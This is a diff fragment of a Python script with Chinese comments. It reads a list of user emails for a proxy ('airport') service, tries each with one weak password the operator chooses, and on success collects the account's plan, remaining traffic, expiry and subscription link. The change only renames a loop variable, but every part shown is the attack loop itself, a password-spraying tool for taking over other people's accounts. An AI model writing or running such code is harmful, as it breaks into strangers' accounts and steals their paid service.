@@ -21,8 +21,8 @@ emails = []
 with open('机场users.txt', 'r', encoding='UTF-8') as fp:
     for m in fp:
         emails.append(m)
-for i in emails:
-    post_data = {'email': i,
+for email in emails:
+    post_data = {'email': email,
                  'password': '自定义一个弱口令',
                  }
     try:
@@ -51,7 +51,7 @@ for i in emails:
 
                 sub_plan = resp1.json()["data"]["plan"]["name"]
                 sub_plan1 = sub_plan.encode('unicode_escape').decode('unicode_escape')  # linux使用sub_plan.encode('utf-8').decode('unicode_escape')编码
-                result_temp = '账号：' + i + '密码：' + '【自定义的弱口令】' + '\n' + '套餐名称：' + sub_plan1 + '\n' + '剩余流量：' + traffic_balance + 'GB' + '\n' + '到期时间：' + expired_at + '\n' + '订阅链接：' + sub_link + '\n\n'  # 修改【自定义的弱口令】
+                result_temp = '账号：' + email + '密码：' + '【自定义的弱口令】' + '\n' + '套餐名称：' + sub_plan1 + '\n' + '剩余流量：' + traffic_balance + 'GB' + '\n' + '到期时间：' + expired_at + '\n' + '订阅链接：' + sub_link + '\n\n'  # 修改【自定义的弱口令】
                 print(result_temp)
                 result.append(result_temp)
                 time.sleep(1)
